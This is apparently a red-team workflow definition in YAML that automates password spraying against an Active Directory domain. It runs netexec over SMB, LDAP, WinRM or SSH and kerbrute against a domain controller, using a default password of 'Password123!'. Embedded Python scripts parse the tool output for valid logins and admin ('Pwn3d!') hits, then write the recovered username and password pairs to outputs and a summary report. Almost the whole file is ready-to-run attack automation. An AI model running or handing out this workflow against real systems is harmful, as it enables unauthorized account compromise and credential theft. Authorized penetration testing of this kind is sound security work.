# yaml-language-server: $schema=~/.ofx/workflow_schema.json
name: password-spray
description: 'Password spraying — tests a list of passwords against discovered user
  accounts across multiple protocols with configurable timing.

  '
tags:
- redteam
- ad
- brute
- spray
- credentials
dispatch:
  inputs:
    target:
      required: true
      type: string
      description: Target host or DC
    domain:
      required: true
      type: string
      description: Domain name
    users_file:
      required: true
      type: string
      description: Path to username list file
    password:
      type: string
      default: Password123!
      description: Password to spray
    protocol:
      type: string
      default: smb
      description: 'Protocol: smb, ldap, winrm, ssh'
jobs:
  spray-smb:
    name: Protocol Spray (netexec)
    steps:
    - name: nxc-spray
      run: 'netexec {{ inputs.protocol }} {{ inputs.target }} -u {{ inputs.users_file
        }} -p ''{{ inputs.password }}'' -d {{ inputs.domain }} --continue-on-success
        2>/dev/null | tee /tmp/nxc-spray.txt

        '
      continue-on-error: true
    - name: collect-smb-hits
      script: "import re\n\nvalid_creds = []\ntry:\n    with open('/tmp/nxc-spray.txt')\
        \ as f:\n        for line in f:\n            if '[+]' in line or 'Pwn3d!'\
        \ in line:\n                match = re.search(r'(\\S+?)\\\\(\\S+?):(\\S+)',\
        \ line)\n                if match:\n                    valid_creds.append({\n\
        \                        'domain': match.group(1),\n                     \
        \   'username': match.group(2),\n                        'password': match.group(3),\n\
        \                        'pwned': 'Pwn3d!' in line,\n                    })\n\
        except FileNotFoundError:\n    pass\n\nwith open('{{ env.OFX_OUTPUTS }}',\
        \ 'a') as f:\n    f.write(f\"smb_hits={len(valid_creds)}\\n\")\n    for cred\
        \ in valid_creds:\n        status = \" [ADMIN]\" if cred['pwned'] else \"\"\
        \n        f.write(f\"smb_cred={cred['domain']}\\\\{cred['username']}:{cred['password']}{status}\\\
        n\")\n\nprint(f\"netexec spray: {len(valid_creds)} valid credentials found\"\
        )\nfor cred in valid_creds:\n    status = \" [ADMIN]\" if cred['pwned'] else\
        \ \"\"\n    print(f\"  [+] {cred['domain']}\\\\{cred['username']}:{cred['password']}{status}\"\
        )\n"
  spray-kerberos:
    name: Kerberos Spray (kerbrute)
    steps:
    - name: kerbrute-spray
      run: 'kerbrute passwordspray --dc {{ inputs.target }} -d {{ inputs.domain }}
        {{ inputs.users_file }} ''{{ inputs.password }}'' 2>/dev/null | tee /tmp/kerbrute-spray.txt

        '
      continue-on-error: true
    - name: collect-kerb-hits
      script: "import re\n\nkerb_creds = []\ntry:\n    with open('/tmp/kerbrute-spray.txt')\
        \ as f:\n        for line in f:\n            match = re.search(r'VALID LOGIN:\\\
        s+(\\S+)@', line)\n            if match:\n                kerb_creds.append(match.group(1))\n\
        except FileNotFoundError:\n    pass\n\nwith open('{{ env.OFX_OUTPUTS }}',\
        \ 'a') as f:\n    f.write(f\"kerb_hits={len(kerb_creds)}\\n\")\n    f.write(f\"\
        kerb_valid_users={chr(10).join(kerb_creds)}\\n\")\n\nprint(f\"Kerberos spray:\
        \ {len(kerb_creds)} valid logins\")\nfor user in kerb_creds:\n    print(f\"\
        \  [+] {user}@{{ inputs.domain }}\")\n"
  results:
    name: Spray Results Summary
    needs:
    - spray-smb
    - spray-kerberos
    steps:
    - name: collect-results
      script: "all_users = set()\n\n# Collect from netexec\nsmb_hits = int('{{ jobs[\"\
        spray-smb\"].outputs.smb_hits | default(\"0\", true) }}')\nkerb_hits = int('{{\
        \ jobs[\"spray-kerberos\"].outputs.kerb_hits | default(\"0\", true) }}')\n\
        \nkerb_users = '{{ jobs[\"spray-kerberos\"].outputs.kerb_valid_users | default(\"\
        \", true) }}'\nfor u in kerb_users.strip().split('\\n'):\n    if u.strip():\n\
        \        all_users.add(u.strip())\n\nwith open('{{ env.OFX_OUTPUTS }}', 'a')\
        \ as f:\n    f.write(f\"total_hits={smb_hits + kerb_hits}\\n\")\n    f.write(f\"\
        unique_users={len(all_users)}\\n\")\n\nprint(f\"Total valid credentials: {smb_hits\
        \ + kerb_hits}\")\nprint(f\"Unique compromised users: {len(all_users)}\")\n"
    - name: report
      run: 'echo "======================================================"

        echo " PASSWORD SPRAY COMPLETE: {{ inputs.target }}"

        echo " Domain: {{ inputs.domain }}"

        echo " Password: {{ inputs.password }}"

        echo " Protocol: {{ inputs.protocol }}"

        echo "======================================================"

        echo ""

        echo "--- Results ---"

        echo "netexec ({{ inputs.protocol }}) hits: {{ jobs[''spray-smb''].outputs.smb_hits
        }}"

        echo "Kerberos hits: {{ jobs[''spray-kerberos''].outputs.kerb_hits }}"

        echo "Total valid: {{ steps[0].outputs.total_hits }}"

        echo "Unique users: {{ steps[0].outputs.unique_users }}"

        '
      log-stdout: true
